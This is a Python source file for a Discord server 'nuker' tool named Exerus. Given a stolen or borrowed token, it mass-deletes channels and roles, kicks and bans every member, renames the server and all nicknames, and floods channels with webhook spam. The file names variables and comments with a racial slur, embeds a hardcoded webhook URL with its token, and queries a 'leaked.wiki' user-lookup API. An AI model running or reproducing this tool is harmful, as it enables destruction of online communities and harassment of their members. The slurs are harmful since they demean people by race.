import requests, json, os, time, ctypes, concurrent.futures, random, hashlib
from colorama import Fore
from threading import Thread

members = 0

w = Fore.WHITE
m = Fore.MAGENTA
try:
    getallinfoss = requests.get("")
    nobro = open("temp.txt", "w+")
    nobro.write(getallinfoss.text)
    nobro.close()
    with open("temp.txt") as f:
        for line in f:
            members += 1
    os.remove("temp.txt")
except:
    print(f"{m}    ┗━━►{w} Error.")
headers = ""
username = ""
guildid = ""
niggerx = ""
name = ""
webhookcontent = ""
userrn = ""
loggeduser = ""
created = 0
checkwhonicked = []
spam = True
clear = lambda: os.system('cls')
notthelogo = f"""{m}
        ▄▄▄ .▐▄• ▄ ▄▄▄ .▄▄▄  ▄• ▄▌.▄▄ ·  Discord: {w}7nr#7077{m}
        ▀▄.▀· █▌█▌▪▀▄.▀·▀▄ █·█▪██▌▐█ ▀.  Github: {w}7nr{m}
        ▐▀▀▪▄ ·██· ▐▀▀▪▄▐▀▀▄ █▌▐█▌▄▀▀▀█▄   Instagram: {w}@tooreex{m}
        ▐█▄▄▌▪▐█·█▌▐█▄▄▌▐█•█▌▐█▄█▌▐█▄▪▐█   Server: {w}dsc.{w}gg/solution{m}
         ▀▀▀ •▀▀ ▀▀ ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀▀   Registered: {w}{members}{m}
    {m}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {m}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""".replace(".", f"{w}.{m}").replace("•", f"{w}•{m}").replace("·", f"{w}·{m}").replace("▪", f"{w}▪{m}")


# Delete all channels stuff
def delchaworker(channels):
    nomf = True
    r = requests.delete(f'https://discord.com/api/v8/channels/'+channels['id'], headers=headers)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Deleted {m}~>{w} {channels['id']}")
    else:
        print(f"{m}    ┗━━►{w} Error.")
        while nomf:
            r = requests.delete(f'https://discord.com/api/v8/channels/'+channels['id'], headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}    ┗━━►{w} Deleted {m}~>{w} {channels['id']}")
                nomf = False
            else:
                print(f"{m}    ┗━━►{w} Error.")
def deletechannels():
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    channels = []
    channelamount = 0
    channelid = requests.get(f"https://discord.com/api/v8/guilds/{guildid}/channels", headers=headers).json()
    for id in channelid:
        channels.append(id)
        channelamount += 1
    print(f"{m}    ┗━━►{w} Successfully scraped {channelamount} channels.")
    with concurrent.futures.ThreadPoolExecutor(max_workers=channelamount) as executor:
        executor.map(delchaworker, channels)
    print(f"{m}    ┗━━►{w} Done Deleting all channels.")
    time.sleep(3)
    main()

# Create alot channels stuff
def crechaworker():
    while True:
        try:
            global created
            json = {
                        'name': name,
                        'type': 0
                    }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guildid}/channels', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}    ┗━━►{w} Created {m}~>{w} {json['name']}")
            else:
                print(f"{m}    ┗━━►{w} Error.")
                while nomf:
                    r = requests.post(
                        f'https://discord.com/api/v8/guilds/{guildid}/channels', headers=headers, json=json)
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{m}    ┗━━►{w} Created {m}~>{w} {json['name']}")
                        nomf = False
                    elif r.status_code == 429:
                        break
                    else:
                        print(f"{m}    ┗━━►{w} Error.")
            created += 1
            break
        except:
            pass
def createchannels():
    global guildid, name
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    name = str(input(f"    {m}┏━━━━━━{w}Enter Channel name{m}\n    ┗━━►{w}"))
    amount = int(input(f"    {m}┏━━━━━━{w}Enter amount to create{m}\n    ┗━━►{w}"))
    for x in range(amount):
        Thread(target=crechaworker).start()
    while True:
        if created >= amount:
            break
        else:
            pass
    main()
    

# Create alot roles
def rolcreworker():
    while True:
        try:
            global created
            json = {
                        'hoist': 'true',
                        'name': name,
                        'mentionable': 'true',
                        'color': random.randint(1000000,9999999),
                        'permissions': random.randint(1,10)
                    }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guildid}/roles', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}    ┗━━►{w} Created Role {m}~>{w} {json['name']}")
                break
            else:
                nomf = True
                while nomf:
                    r = requests.post(f'https://discord.com/api/v8/guilds/{guildid}/roles', headers=headers, json=json)
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{m}    ┗━━►{w} Created Role {m}~>{w} {json['name']}")
                        nomf = False
                    elif r.status_code == 429:
                        break
                    else:
                        pass
            created += 1
            break
        except: pass
def rolecreator():
    global guildid, name
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    name = str(input(f"    {m}┏━━━━━━{w}Enter role name{m}\n    ┗━━►{w}"))
    amount = int(input(f"    {m}┏━━━━━━{w}Enter amount to create{m}\n    ┗━━►{w}"))
    for x in range(amount):
        Thread(target=rolcreworker).start()
    while True:
        if created >= amount:
            break
        else:
            pass
    main()


# delete all roles
def delrolworker(roles):
    r = requests.delete(f'https://discord.com/api/v8/guilds/{guildid}/roles/'+roles['id'], headers=headers)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Deleted {m}~>{w} {roles['id']}")
    else:
        print(f"{m}    ┗━━►{w} Error.")
        trys = 0
        nomf = True
        while nomf:
            if trys >= 3:
                break
            else:
                pass
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guildid}/roles/'+roles['id'], headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{m}    ┗━━►{w} Deleted {m}~>{w} {roles['id']}")
                nomf = False
            else:
                print(f"{m}    ┗━━►{w} Error.")
            trys += 1
def roledeleter():
    global guildid
    roles = []
    roleamount = 0
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    roleids = requests.get(f"https://discord.com/api/v8/guilds/{guildid}/roles", headers=headers).json()
    for id in roleids:
        roles.append(id)
        roleamount += 1
    print(f"{m}    ┗━━►{w} Successfully scraped {roleamount} roles.")
    with concurrent.futures.ThreadPoolExecutor(max_workers=roleamount) as executor:
        executor.map(delrolworker, roles)
    print(f"{m}    ┗━━►{w} Done Deleting all roles.")
    time.sleep(3)
    main()


# kick everyone
def kickworker(members):
    json = {'reason': niggerx}
    member = members['user']['id']
    r = requests.delete(f'https://discord.com/api/v8/guilds/{guildid}/members/{member}', headers=headers, json=json)
    if r.status_code == 204:
        print(f"{m}    ┗━━►{w} Kicked {members['user']['username']}#{members['user']['discriminator']}")
    else:
        pass
def masskick():
    global niggerx, guildid
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    niggerx = str(input(f"    {m}┏━━━━━━{w}Enter Reason{m}\n    ┗━━►{w}"))
    for x in range(25):
        members = []
        scraped = 0
        memberids = requests.get(f'https://discord.com/api/v8/guilds/{guildid}/members?limit=1000', headers=headers).json()
        for id in memberids:
            members.append(id)
            scraped +=1
        with concurrent.futures.ThreadPoolExecutor(max_workers=scraped) as executor:
            executor.map(kickworker, members)
    main()


# ban everyone 
def banworker(members):
    member = members['user']['id']
    json = {
                'delete_message_days': '7',
                'reason': f'dsc.gg/solution'
            }
    r = requests.put(f'https://discord.com/api/v8/guilds/{guildid}/bans/{member}', headers=headers, json=json)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Banned {members['user']['username']}#{members['user']['discriminator']}")
    else:
        pass
def massban():
    global niggerx, guildid
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    niggerx = str(input(f"    {m}┏━━━━━━{w}Enter Reason{m}\n    ┗━━►{w}"))
    for x in range(25):
        members = []
        scraped = 0
        memberids = requests.get(f'https://discord.com/api/v8/guilds/{guildid}/members?limit=1000', headers=headers).json()
        for id in memberids:
            members.append(id)
            scraped +=1
        with concurrent.futures.ThreadPoolExecutor(max_workers=scraped) as executor:
            executor.map(banworker, members)
    main()


# channel spammer
def spamworker(channels):
    global spam
    channel = channels['id']
    json = {'name': "dsc.gg/solution"}
    while spam == True:
        try:
            r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
            if r.status_code == 429:
                print(f"{m}    ┗━━►{w} Ratelimit. Retry in {r.json()['retry_after']}s")
                time.sleep(float(r.json()['retry_after']))
            else:
                web_id = r.json()['id']
                web_token = r.json()['token']
                break
        except:
            spam = False
    while spam == True:
        try:
            payload = {'username': "dsc.gg/solution",'content': webhookcontent}
            time.sleep(2)
            x = requests.post(f"https://discord.com/api/webhooks/{web_id}/{web_token}", json=payload)
            if x.status_code == 200:
                print(f"{m}    ┗━━►{w} Sent Message.")
            else:
                print(f"{m}    ┗━━►{w} Failed sending.")
        except:
            spam = False
def spamchannels():
    global webhookcontent, spam
    channels = []
    scraped = 0
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    webhookcontent = str(input(f"    {m}┏━━━━━━{w}Enter Message{m}\n    ┗━━►{w}"))
    channelid = requests.get(f"https://discord.com/api/v8/guilds/{guildid}/channels", headers=headers).json()
    for id in channelid:
        channels.append(id)
        scraped += 1
    print(f"{m}    ┗━━►{w} Successfully scraped {scraped} channels.")
    with concurrent.futures.ThreadPoolExecutor(max_workers=scraped) as executor:
            executor.map(spamworker, channels)
    spam = False
    time.sleep(3)
    main()


# guild renaming
def renameit():
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    name = str(input(f"    {m}┏━━━━━━{w}Enter Name{m}\n    ┗━━►{w}"))
    json = {'name': name}
    r = requests.patch(f'https://discord.com/api/v8/guilds/{guildid}', headers=headers, json=json)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Successfully renamed.")
    else:
        print(f"{m}    ┗━━►{w} Failed renaming.")
    main()


# nickname changer
def nickchaworker(members):
    global checkwhonicked
    member = members['user']['id']
    json = {"nick": niggerx}
    if member in checkwhonicked:
        pass
    else:
        r = requests.patch(f"https://discord.com/api/v8/guilds/{guildid}/members/{member}?nick=niggerx", headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{m}    ┗━━►{w} Successfully nicked {members['user']['username']}#{members['user']['discriminator']}")
            checkwhonicked.append(member)
        else:
            pass
def changenick():
    global niggerx, guildid, checkwhonicked
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    niggerx = str(input(f"    {m}┏━━━━━━{w}Enter Name{m}\n    ┗━━►{w}"))
    members = []
    scraped = 0
    memberids = requests.get(f'https://discord.com/api/v8/guilds/{guildid}/members?limit=1000', headers=headers).json()
    for id in memberids:
        members.append(id)
        scraped +=1
    with concurrent.futures.ThreadPoolExecutor(max_workers=scraped) as executor:
        executor.map(nickchaworker, members)
    main()


# total nuke my nigga
def nukedlmfao():
    try:
        json = {
                        'name': "dsc-gg-solution",
                        'type': 0
                    }
        r = requests.post(f'https://discord.com/api/v8/guilds/{guildid}/channels', headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{m}    ┗━━►{w} Created {m}~>{w} {json['name']}")
            try:
                json = {
                    'name': "dsc-gg-solution"
                }
                channel = r.json()['id']
                xy = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
                web_id = xy.json()['id']
                web_token = xy.json()['token']
                while True:
                    try:
                        payload = {'username': "dsc.gg/solution",'content': "@everyone nuked / dsc.gg/solution"}
                        time.sleep(2)
                        x = requests.post(f"https://discord.com/api/webhooks/{web_id}/{web_token}", json=payload)
                        if x.status_code == 200 or x.status_code == 201 or x.status_code == 204:
                            print(f"{m}    ┗━━►{w} Sent Message.")
                        else:
                            print(f"{m}    ┗━━►{w} Failed sending.")
                    except:
                        break
            except:
                print(f"{m}    ┗━━►{w} Error.")
        else:
            print(f"{m}    ┗━━►{w} Error.")
    except:
        print(f"{m}    ┗━━►{w} Error.")


def rolenukeworker():
    json = {
                        'hoist': 'true',
                        'name': "dsc.gg/solution",
                        'mentionable': 'true',
                        'color': random.randint(1000000,9999999),
                        'permissions': random.randint(1,10)
                    }
    r = requests.post(f'https://discord.com/api/v8/guilds/{guildid}/roles', headers=headers, json=json)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Created Role {m}~>{w} {json['name']}")
def nukedelchaworker(channels):
    r = requests.delete(f'https://discord.com/api/v8/channels/'+channels['id'], headers=headers)
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{m}    ┗━━►{w} Deleted {m}~>{w} {channels['id']}")
    else:
        print(f"{m}    ┗━━►{w} Error.")
def totalnuke():
    global guildid
    try:
        rusure = str(input(f"    {m}┏━━━━━━{w}are you sure? y/n{m}\n    ┗━━►{w}")).lower()
        if rusure == "y":
            pass
        else:
            main()
    except:
        main()
    guildid = str(input(f"    {m}┏━━━━━━{w}Enter Guild ID{m}\n    ┗━━►{w}"))
    for x in range(25):
        time.sleep(.01)
        clear()
        drop = "\n"
        print(f'''{drop*x}{m}
                         .....     
                         :--.-     
                          ::-      
                         -:--.     
                         /+::-     
                         /+::-     
                         /+::-     
                         /+::-     
                         :+//-     
                          `-`   ''')
    print('''__________________________________________________________''')
    time.sleep(0.15)
    clear()
    print(f'''{m} {drop*25}
                                 ____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===----- -- -
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                         ` ^'"`-' "
__________________________________________________________''')
    time.sleep(2)
    clear()
    print(f'''{m}
    
           ▄     ▄   █  █▀ ▄███▄   ██▄   
            █     █  █▄█   █▀   ▀  █  █  
        ██   █ █   █ █▀▄   ██▄▄    █   █ 
        █ █  █ █   █ █  █  █▄   ▄▀ █  █  
        █  █ █ █▄ ▄█   █   ▀███▀   ███▀  
        █   ██  ▀▀▀   ▀                                               
''')
    try:
        print(f"{m}    ┗━━►{w} Changing Server name.")
        json = {'name': "nuked by dsc.gg/solution"}
        r = requests.patch(f'https://discord.com/api/v8/guilds/{guildid}', headers=headers, json=json)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{m}    ┗━━►{w} Successfully renamed.")
        else:
            print(f"{m}    ┗━━►{w} Failed renaming.")
        
        print(f"{m}    ┗━━►{w} Changing nicknames.")
        members = []
        scraped = 0
        memberids = requests.get(f'https://discord.com/api/v8/guilds/{guildid}/members?limit=1000', headers=headers).json()
        for id in memberids:
            members.append(id)
            scraped += 1
        with concurrent.futures.ThreadPoolExecutor(max_workers=scraped) as executor:
            executor.map(nickchaworker, members)
        print(f"{m}    ┗━━►{w} Done nickname changing.")
        print(f"{m}    ┗━━►{w} Deleting all roles.")
        roles = []
        roleamount = 0
        roleids = requests.get(f"https://discord.com/api/v8/guilds/{guildid}/roles", headers=headers).json()
        for id in roleids:
            roles.append(id)
            roleamount += 1
        with concurrent.futures.ThreadPoolExecutor(max_workers=roleamount) as executor:
            executor.map(delrolworker, roles)
        print(f"{m}    ┗━━►{w} Done Deleting all roles.")
        print(f"{m}    ┗━━►{w} Creating roles.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(rolenukeworker)
        print(f"{m}    ┗━━►{w} Creating roles done.")
        print(f"{m}    ┗━━►{w} Deleting Channels.")
        channels = []
        channelamount = 0
        channelid = requests.get(f"https://discord.com/api/v8/guilds/{guildid}/channels", headers=headers).json()
        for id in channelid:
            channels.append(id)
            channelamount += 1
        if channelamount == 0:
            channelamount = 1
        with concurrent.futures.ThreadPoolExecutor(max_workers=channelamount) as executor:
            executor.map(nukedelchaworker, channels)
        print(f"{m}    ┗━━►{w} Done Deleting all channels.")
        print(f"{m}    ┗━━►{w} Creating and spamming channels.")
        for x in range(100):
            Thread(target=nukedlmfao).start()
        input()
        main()
    except Exception as e:
        print(f"{m}{e} i guess an ugly ass error happend join dsc.gg/solution for help.")


def main():
    global checkwhonicked
    checkwhonicked = []
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW(f"☣ Exerus | Menu | User: {username} | Logged in as: {loggeduser}")
    logo = f"""{m}
        ▄▄▄ .▐▄• ▄ ▄▄▄ .▄▄▄  ▄• ▄▌.▄▄ ·  Discord: {w}tooreex#7077{m}
        ▀▄.▀· █▌█▌▪▀▄.▀·▀▄ █·█▪██▌▐█ ▀.  Github: {w}7nr{m}
        ▐▀▀▪▄ ·██· ▐▀▀▪▄▐▀▀▄ █▌▐█▌▄▀▀▀█▄   Instagram: {w}@tooreex{m}
        ▐█▄▄▌▪▐█·█▌▐█▄▄▌▐█•█▌▐█▄█▌▐█▄▪▐█   Server: {w}dsc.{w}gg/solution{m}
         ▀▀▀ •▀▀ ▀▀ ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀▀   User: {w}{username}{m}""".replace(".", f"{w}.{m}").replace("•", f"{w}•{m}").replace("·", f"{w}·{m}").replace("▪", f"{w}▪{m}")

    print(logo)
    print(f"""    {m}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {m}┃ {m}1 {w}- {m}Delete Channels  {w}| {m}4 {w}- {m}Delete Roles   {w}| {m}7 {w}- {m}Channel Spammer     ┃
    {m}┃ {m}2 {w}- {m}Create Channels  {w}| {m}5 {w}- {m}Kick Everyone  {w}| {m}8 {w}- {m}Change Server Name  ┃
    {m}┃ {m}3 {w}- {m}Create Roles     {w}| {m}6 {w}- {m}Ban Everyone   {w}| {m}9 {w}- {m}Change Nicknames    ┃
    {m}┃                      {w}|{m}666{w} - {m}Drop The Nuke{w} |{m}                         ┃
    {m}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
    try:
        choice = int(input(f"    {m}┏━━━━━━{w}{username}@exerus{m}\n    ┗━━►{w}"))
        if choice == 1:
            deletechannels()
        elif choice == 2:
            createchannels()
        elif choice == 3:
            rolecreator()
        elif choice == 4:
            roledeleter()
        elif choice == 5:
            masskick()
        elif choice == 6:
            massban()
        elif choice == 7:
            spamchannels()
        elif choice == 8:
            renameit()
        elif choice == 9:
            changenick()
        elif choice == 666:
            totalnuke()
        else:
            print(f"{m}    ┗━━►{w} Invalid Option.")
    except KeyboardInterrupt:
        os._exit(1)
    except:
        main()

def login():
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("☣ Exerus | Enter Token")
    global headers, username
    print(notthelogo)
    token = str(input(f"    {m}┏━━━━━━{w}Enter the user/bot token{m}\n    ┗━━►{w}"))
    print(f"{m}    ┗━━►{w} Logging in...")
    x = requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token})
    if x.status_code == 200:
        username = f"{x.json()['username']}#{x.json()['discriminator']}"
        headers = {"Authorization": f'{token}',"User-Agent": "sussyfridge 6/9", "Host": "discord.com"}
        print(f"{m}    ┗━━►{m} Successfully logged in as {w}{username}")
        time.sleep(0.5)
        main()
    else: pass
    headers = {"Authorization": f'Bot {token}',"User-Agent": "sussyfridge 6/9"}
    witchblade = requests.get("https://discord.com/api/v8/users/@me", headers=headers)
    if not witchblade.status_code == 401:
        username = f"{witchblade.json()['username']}#{witchblade.json()['discriminator']}"
        headers = {"Authorization": f'Bot {token}',"User-Agent": "sussyfridge 6/9", "Host": "discord.com"}
        print(f"{m}    ┗━━►{m} Successfully logged in as {w}{username}")
        time.sleep(0.5)
        main()
    elif witchblade.status_code == 401:
        print(f"{m}    ┗━━►{w} Invalid Token.")
        time.sleep(2)
        clear()
        login()
    elif witchblade.status_code == 429:
        print(f"{m}    ┗━━►{w} Ratelimited.")
        time.sleep(2)
        clear()
        login()
    else:
        print(
            f"{m}    ┗━━►{w} Oh no! A Weird ass error occured please contact tooreex#7077")
        input()
        login()

def reallogin():
    clear()
    w = Fore.WHITE
    m = Fore.MAGENTA
    global members, loggeduser
    ctypes.windll.kernel32.SetConsoleTitleW("☣ Exerus | Login")
    notthelogo = f"""{m}
        ▄▄▄ .▐▄• ▄ ▄▄▄ .▄▄▄  ▄• ▄▌.▄▄ ·  Discord: {w}tooreex#7077{m}
        ▀▄.▀· █▌█▌▪▀▄.▀·▀▄ █·█▪██▌▐█ ▀.  Github: {w}7nr{m}
        ▐▀▀▪▄ ·██· ▐▀▀▪▄▐▀▀▄ █▌▐█▌▄▀▀▀█▄   Instagram: {w}@tooreex{m}
        ▐█▄▄▌▪▐█·█▌▐█▄▄▌▐█•█▌▐█▄█▌▐█▄▪▐█   Server: {w}dsc.{w}gg/solution{m}
         ▀▀▀ •▀▀ ▀▀ ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀▀   Registered: {w}{members}{m}
    {m}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {m}┃                {m}1 {w}- {m}Login              {m}2 {w}- {m}Register                  ┃
    {m}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""".replace(".", f"{w}.{m}").replace("•", f"{w}•{m}").replace("·", f"{w}·{m}").replace("▪", f"{w}▪{m}")
    print(notthelogo)
    choice = int(input(f"    {m}┏━━━━━━{w}Enter your choice.{m}\n    ┗━━►{w}"))
    if choice == 1:
        try:
            username = str(input(f"    {m}┏━━━━━━{w}Enter your Discord ID{m}\n    ┗━━►{w}"))
            hashuser = hashlib.sha512(username.encode())
            hasheduser = hashuser.hexdigest()
            password = str(input(f"    {m}┏━━━━━━{w}Enter your Password{m}\n    ┗━━►{w}"))
            hashpass = hashlib.sha512(password.encode())
            hashedpassword = hashpass.hexdigest()
            getallinfoss = requests.get("")
            if hasheduser in getallinfoss.text:
                try:
                    text = getallinfoss.text
                    nobro = open("temp.txt", "w+")
                    nobro.write(text)
                    nobro.close()
                    with open("temp.txt") as f:
                        for line in f:
                            if hasheduser in line:
                                getuserinfo = line
                        f.close()
                    os.remove("temp.txt")
                    userinfo = getuserinfo.split(":")
                    try:
                        if hasheduser == userinfo[0] and hashedpassword == userinfo[1]:
                            r = requests.get(f"https://api.leaked.wiki/discorduser?id={username}&json=yes")
                            loggeduser = f"{r.json()['username']}#{r.json()['discriminator']}"
                            login()
                        else:
                            print(f"{m}    ┗━━►{w} Invalid credentials.")
                    except:
                        print(f"{m}    ┗━━►{w} Failed Loading Database.")
                except:
                    print(f"{m}    ┗━━►{w} Failed Loading Database.")
            else:
                print(f"{m}    ┗━━►{w} Your not in the database.")
                input(f"{getallinfoss.text} {hasheduser} : {hashedpassword}")
        except Exception as e:
            print(f"{m}    ┗━━►{w}{e} weird ass error happend dm tooreex#7077 on discord")
    elif choice == 2:
        username = str(input(f"    {m}┏━━━━━━{w}Enter your Discord ID{m}\n    ┗━━►{w}"))
        hashuser = hashlib.sha512(username.encode())
        hasheduser = hashuser.hexdigest()
        password = str(input(f"    {m}┏━━━━━━{w}Enter your Password{m}\n    ┗━━►{w}"))
        hashpass = hashlib.sha512(password.encode())
        hashedpassword = hashpass.hexdigest()
        r = requests.post(f"https://discord.com/api/webhooks/909870963934523442/Q2HiLyuyE_ZIw6BvaqsP6lt3-iZqurVEQ-RemrQw85IT2v3a3ZgxXD9MghsYeSEz0JB3", json={
                                    'content': f"New Register!!!\n``{hasheduser}:{hashedpassword}:{username}``"})
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{m}    ┗━━►{w} Registration Sent.")
        else:
            print(f"{m}    ┗━━►{w} Failed sending registration.")
        print(f"{m}    ┗━━►{w} The Registration is not fully automated yet.")
        print(f"{m}    ┗━━►{w} Please Create a ticket to get added to ")
        print(f"{m}    ┗━━►{w} the database and be able to use the tool.")
        input(f"{m}    ┗━━►{w} [ENTER] to return to menu")
        reallogin()
    else:
        reallogin()
if __name__ == "__main__":
    clear()
    reallogin()
